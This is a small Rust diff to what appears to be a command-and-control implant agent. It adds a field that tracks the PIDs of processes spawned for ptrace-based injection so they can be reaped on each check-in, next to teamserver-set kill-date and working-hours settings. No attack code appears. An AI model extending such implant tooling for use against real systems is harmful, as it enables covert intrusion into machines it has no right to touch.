@@ -37,6 +37,12 @@ pub(crate) struct PhantomState {
     pub(crate) kill_date: Option<i64>,
     /// Working-hours bitmask set dynamically by the teamserver via `CommandConfig`.
     pub(crate) working_hours: Option<i32>,
+    /// PIDs of processes spawned for injection, tracked for deferred zombie reaping.
+    ///
+    /// After PTRACE_DETACH the injected process runs independently. If it exits before
+    /// the agent, it lingers as `<defunct>` until we call `waitpid`. These PIDs are
+    /// reaped non-blocking on each check-in via `reap_injected_pids`.
+    pub(crate) injected_pids: Vec<u32>,
 }
 
 /// An active pivot connection to a child agent via a Unix domain socket.
